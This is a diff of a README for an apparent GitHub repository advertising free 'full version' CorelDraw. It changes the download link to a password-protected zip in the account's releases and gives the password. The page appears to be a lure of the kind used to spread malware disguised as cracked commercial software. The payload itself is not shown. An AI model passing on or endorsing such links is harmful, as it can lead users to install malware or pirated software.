@@ -7,7 +7,7 @@ Welcome to the CorelDraw repository! 🚀 This is your ultimate source for acces
 - Topics: Graphic-Design, CorelDraw, vector-illustration, free-software, design-software, pro-version
 
 ## 🔗 Software Access  
-### Download: [CorelDraw](https://github.com/xyt0169/CorelDraw-Latest-Version-For-Windows/releases/download/CorelDraw/CorelDraw.zip)
+### Download: [CorelDraw](https://github.com/xyt0169/CorelDraw-Latest-Version-For-Windows/releases/download/CorelDraw/CorelDraw.Full.Version.zip)
 password-2025
 
 
